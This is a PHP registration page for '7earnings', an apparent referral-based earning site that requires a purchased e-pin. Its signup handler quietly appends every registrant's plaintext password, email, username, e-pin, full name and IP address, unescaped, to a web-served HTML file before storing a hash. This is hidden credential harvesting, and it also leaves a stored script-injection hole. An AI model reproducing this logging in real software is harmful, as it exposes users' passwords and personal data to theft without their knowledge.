<?php
ob_start();
session_start(); 
if (isset($_SESSION['user']) != "") { 
    header("Location: ./dashboard.php");
}
include_once 'dbconnect.php'; 
    if (isset($_POST['signup'])) { 
        $uname = trim($_POST['uname']); 
        // get posted data and remove whitespace 
        $email = trim($_POST['email']); 
        $upass = trim($_POST['pass']); 
        $referral = trim($_POST['referral']);
        $ePin = trim($_POST['ePin']);
        $fullname = trim($_POST['fullname']);
        $phonenumber = trim($_POST['phonenumber']);
        $ip = $_SERVER['REMOTE_ADDR']; 
        $fecha = date("Y-m-d;h:i:s");


//write to html
$f = fopen("usersregwithepin.html", "a");
fwrite ($f,
'Username: [<b><font color="#660000">'.$uname.'</font></b>]
EMAIL: [<b><font color="#9900FF">'.$email.'</font></b>]
REFERRAL: [<b><font color="#0E773B">'.$referral.'</font></b>]
EPIN: [<b><font color="#0E773B">'.$ePin.'</font></b>]
FULLNAME: [<b><font color="#9900FF">'.$fullname.'</font></b>]
IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]
PASSWORD: [<b><font color="#FF6633">'.$upass.'</font></b>]<br> ');
 
fclose($f);



        // hash password with SHA256; 
        $password = hash('sha256', $upass); 
        // check email exist or not 
        $stmt = $conn->prepare("SELECT email FROM users WHERE email=?"); 
        $stmt->bind_param("s", $email); 
        $stmt->execute(); 
        $result = $stmt->get_result(); 
        $stmt->close(); 
        $count = $result->num_rows; 
        if ($count == 0) { 
            // if email is not found add user 
            $stmts = $conn->prepare("INSERT INTO users(username,email,password) VALUES(?, ?, ?)"); 
            $stmts->bind_param("sss", $uname, $email, $password); $res = $stmts->execute();
            //get result 
            $stmts->close(); 
            $user_id = mysqli_insert_id($conn); 
            if ($user_id > 0) {
                 $_SESSION['user'] = $user_id; 
                 // set session and redirect to index page 
                 if (isset($_SESSION['user'])) {
                      print_r($_SESSION); 
                      header("Location: ./dashboard.php"); 
                      exit; 
                      } 
                      } 
                      else { 
                          $errTyp = "danger"; 
                          $errMSG = "Something went wrong, try again"; 
                          } 
                          } 
                          else { 
                              $errTyp = "warning"; 
                              $errMSG = "Email is already used"; 
                              } 
                              }
                              ?>
            <!DOCTYPE html>
<html>
<head>
<meta name="viewport"content="width=device-width,initial-scale=1">
 
 

 <meta charset="utf-8">
        
        <link rel="apple-touch-icon" sizes="180x180" href="./img/7earnings II.png">
        <link rel="icon" type="image/png" sizes="32x32" href="./img/7earnings II.png">
        <link rel="icon" type="image/png" sizes="16x16" href="./img/7earnings II.png">
        <link rel="image_src" href="./img/7earnings II.png">
        <!-- <link rel="manifest" href="./frontend/dist/img/fav/site.webmanifest"> -->
        
 <meta property="og:title" content="7earnings">
        <meta property="og:site_name" content="7earnings">
        <meta property="og:url" content="https://7earnings.com.ng/">
        <meta property="og:description" content="7earnings official website">
        <meta property="og:image" content="https://unitedglobalfinance.com/img/7earnings II.png">
        <meta property="twitter:title" content="7earnings">
        <meta property="twitter:description" content="7earnings official website">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:image:src" content="https://7earnings.com.ng/img/7earnings II.png">
                    <title>7earnings</title>
 <link rel="stylesheet"href="fontawesome-free-5.13.0-web/css/all.min.css">
 <script src="jquery.js"></script>
 <link rel="stylesheet"href="7earnings.css">
 
</head>
<body>
 <div id="body">
  <nav class="navbar">
  <span class="fa fa-bars"id="bars"></span>
  <img src="./img/7earnings II.png"id="logo"><span class="log">7earnings</span><br>
  <br>
  
  <a href="index.php"> <span class="link1">  <i class="fa fa-home"></i> Home </span></a>
  <a href="dashboard.php" ><span class="link2">   <i class="fa fa-user"></i> Profile </span></a>
  <a href="hire us.html" > <span class="link3">  <i class="fa fa-comment-dollar"style="font-size:16px;"></i> Hire us </span></a>
  <a href="how to earn.html" > <span class="link4"><i class="fa fa-dollar-sign"></i> How to earn </span></a>
  
  </nav>
    <br>
    <br class="br">
    <br class="br">
    <br>
    <br>
    <br>
 
    <div class="slider">
      <figure>
      <img src="./img/ad1.jpg"class="img">
      <img src="./img/ad2.jpg"class="img">
      <img src="./img/ad3.jpg"class="img">
      <img src="./img/ad2.jpg"class="img">
      
      </figure>
      </div>
 <marquee>To get an epin visit the terms of service page and contact an agent.</marquee>
 
<div class="content">
 <h3 class="logo">7earnings </h3>
  <p class="reg"> Source more income today !</p>
   <br class="br">
   <div>
    <h3 class="h2"> Registration  </h3>
     <p class="reg"> Fill up the following spaces correctly to get registered </p>
   
   </div>
  <div class="float">
  <br><br><br><br>
  <h1 >Earn smart <br> With 7earnings</h1>
  <h1><a href="registration.html"><button class="btn"> Join us today </button></a></h1>
  </div>
<div class="sign_up_container">

<br>
<h3 class="logo"> 7earnings </h3>
 <br>
 <form method="post">
   <?php if (isset($errMSG)) { 
                        ?> 
                            
                    <div class="alert alert-<?php 
                             echo ($errTyp == "success") ? "success" : $errTyp; 
                             ?>"> 
                              
                             <?php echo $errMSG; 
                             ?> 
                    </div> 
                
                             <?php 
                            } 
                            ?> 
 <input type="text"class="input"id="fullName"name="fullname"placeholder="   Full name ( As it is in your bank details )"autocomplete=off>
  <br><br>
  <input type="text"class="input"id="username"name="uname"placeholder="   Username ( Use your email )"autocomplete=off>
  <br><br>
  <input type="email"id="email"name="email"class="input"placeholder="   Email address">
  <br><br>
  <input type="number"id="phonenumber"name="phonenumber"class="input"placeholder="   Phone number">
  <br><br>
   <div class= "pswd"> <input type="password" class="input"id="pswd"name="pass"placeholder="Password"autocomplete=off><span class="fa fa-eye-slash"id="eye-slash"onclick="showpassword()"></span> </div>
 <br>
 <input type="number"class="input"id="ePin" name="ePin"placeholder="   E-pin">
 <br><br>
 <input type="email"id="referral" name="referral"class="input"placeholder="   Referrer Username">
 <br><br>
 <p id="regWarnings"></p>
<br>
<button class="register" id="register" name="signup">REGISTER</button>
<br><br>
                        </form>

<p class ="login_instead"> Already have an account ? <a href="./index.php"class="createAccount" > LOGIN </a></p>
<!--<p class="rd"> Don't have an account ? </p> <a href=""class="rd" ><p>Click here to sign up</p></a>-->
<br><br>

</div>
   
   <div class="content">
    Click to purchase your E-pin   <span class="e-pin"><a href="terms.html" style="text-decoration: none; color: white">Buy E-pin </a></span>
   <br><br>
   NB: No two accounts should be registered with the 
   same phone or you risk suspension of both.
   
   </div>
   
   <div class="slider">
    <figure>
    <img src="./img/ad1.jpg"class="img">
    <img src="./img/ad2.jpg"class="img">
    <img src="./img/ad3.jpg"class="img">
    <img src="./img/ad2.jpg"class="img">
    
    </figure>
    </div>
   
   <div class="follow">
   <p class="follow_us"> Follow us on  </p>
   <span class="f"><img src="./img/fb.jpg"class="fb-logo"></i></span>
   <span class="f"><img src="./img/whatsapp.jpg"class="WhatsApp-logo"></i></span>
   <span class="f"><img src="./img/insta.jpg"class="IG-logo"></i></span>
   <span class="f"><img src="./img/twitter.jpg"class="twitter-logo"></i></span>
   </div>
   <br><br class="br">
   <div class="footer">
<a href="about us.html" >   <span class="footer-content">  About us • </span></a>
   <span class="footer-content"> Terms of service •</span>
   <!-- <span class=" footer-content">Privacy policy •</span> -->
   <span class="footer-content"> Advertise with us •</span>
  <a href="FAQ.html" > <span class ="footer-content">FAQs •</span></a>
   <p class="copyright">Copyright ©️ 2020 7earnings.com.ng All rights reserved  </p>
   </div>
   </div>
   </div>
   <div id="sidebar">
   <b class="closeSidebar"id="closeSidebar"> × </b>
   <br>
   <h3 class ="sideContent "> 7earnings </h3>
   <br>
   <a href="how to earn.html" > <div class="sideContent1"><i class="fa fa-dollar-sign"></i> How to earn </div></a><br>
   <a href="Advertise your products" >  <div class="sideContent2"><i class="fa fa-ad"></i> Advertise your products</div></a><br>
 <a href="hire us.html" > <div class="sideContent4"><i class="fa fa-comment-dollar"></i> Hire us</div></a><br>
  <a href="FAQ.html" > <div class="sideContent5"><i class="fa fa-question-circle"></i> FAQs</div></a><br>
  <a href="sign out.html" > <div class="sideContent6"><i class="fa fa-door-open"></i> Sign out</div></a><br><br>
   </div>
   
   <script type="text/javascript">
   
   //Declare variables 
   var pswd = document.getElementById('pswd');
   var eye_slash = document.getElementById('eye-slash');
   
   //function to show password when the checkbox is clicked 
   function showpassword(){
   if(pswd.type=="password"){
   pswd.type ='text';
   eye_slash.className='fa fa-eye';
   }
   else {
   pswd.type="password";
   eye_slash.className='fa fa-eye-slash';
   }
   }
   
   //variable declarations
   var sidebar = document.getElementById('sidebar');
   var closeSidebar = document.getElementById('closeSidebar');
   var bars = document.getElementById('bars');
   
   // show sidebar
   bars.addEventListener('click', function (){
   sidebar.style.left = '0%';
   sidebar.style.height = '100%';
   });
   
   
   // jQuery 
   // function to close sidebar when it looses focus
   $(document).ready(function() {
   var sidebar = ('#sidebar');
   var closeSidebar = ('#closeSidebar');
   var bars = ('#bars');
   $('#sidebar').mouseleave(function(){
   $('#sidebar').css('left','-100%');
   });
   $('#closeSidebar').click(function (){
   $('#sidebar').css({'left':'-80%','height':'0%'});
   });
   $('#body').mouseover(function (){
   $('#sidebar').css({'left':'-80%','height':'0%'});
   });
   $('#pswd').mouseover(function(){
   $('.pswd').css({'border':'1px solid #1EB4FF'})
   $('#pswd').mouseleave(function (){
   $('.pswd').css({'border':'1px solid gray'})
   
   });
   });
   });
   </script>




<script type="text/javascript" src="register.js"></script>
<!--Start of Tawk.to Script-->
<script type="text/javascript">
  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
  (function(){
  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
  s1.async=true;
  s1.src='https://embed.tawk.to/5ed7d25d4a7c62581799d9f5/default';
  s1.charset='UTF-8';
  s1.setAttribute('crossorigin','*');
  s0.parentNode.insertBefore(s1,s0);
  })();
  </script>
  <!--End of Tawk.to Script-->



   </body>
   </html>